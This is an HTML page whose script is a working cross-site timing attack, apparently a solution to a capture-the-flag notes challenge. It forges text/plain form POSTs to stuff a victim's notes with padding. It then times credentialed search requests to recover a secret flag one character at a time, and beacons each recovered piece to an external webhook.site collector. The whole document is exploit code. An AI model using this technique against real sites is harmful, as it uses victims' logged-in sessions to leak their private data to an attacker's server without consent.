<!doctype html><html><body><iframe name="sink" style="display:none"></iframe><script>
const TARGET='https://localhost:3000', COLLECT='https://5e0f0fb8-5d1c-4ea5-978d-5c3d2ac391a8.webhook.site/log', NID=1, N_SUB=40;
const WORDS=Array(6000).fill('qq').join(' '), PREFIX='inctf{';
const CS="_abcdefghijklmnopqrstuvwxyz0123456789{}-!?.@$#ABCDEFGHIJKLMNOPQRSTUVWXYZ".split('');
function log(k,v){new Image().src=COLLECT+'?'+k+'='+encodeURIComponent(v)+'&t='+Date.now();}
function addF(){return new Promise(r=>{const f=document.createElement('form');f.method='POST';f.action=TARGET+'/notes/'+NID+'/subnotes';f.enctype='text/plain';f.target='sink';const i=document.createElement('input');i.name='{"content":"';i.value=' '+WORDS+'"}';f.appendChild(i);document.body.appendChild(f);const s=document.getElementsByName('sink')[0];s.onload=()=>{try{f.remove();}catch(e){}r();};f.submit();});}
async function tq(q,n){let b=Infinity;for(let i=0;i<(n||3);i++){const t0=performance.now();try{await fetch(TARGET+'/notes/search?q='+encodeURIComponent(q),{mode:'no-cors',credentials:'include',cache:'no-store'});}catch(e){}const dt=performance.now()-t0;if(dt<b)b=dt;}return b;}
async function run(){
 log('D','start');
 const t0=Math.round(await tq(PREFIX));
 for(let i=0;i<N_SUB;i++){await addF();}
 const ta=Math.round(await tq(PREFIX)), tc=Math.round(await tq('zzqzqzx'));
 log('AMP','before='+t0+' after='+ta+' ctrl='+tc);
 const gap=ta-tc, thr=tc+Math.max(40,gap*0.5);
 if(gap<60){ log('D','NO_AMP_gap'+gap); return; }
 let k=PREFIX; log('known',k);
 for(let p=0;p<80;p++){let f=null;for(const c of CS){if(await tq(k+c,2)>thr){f=c;break;}}if(f===null){log('D','stuck_'+k);break;}k+=f;log('known',k);if(f==='}'){log('FLAG',k);break;}}
 log('D','done_'+k);
}
run();
</script></body></html>
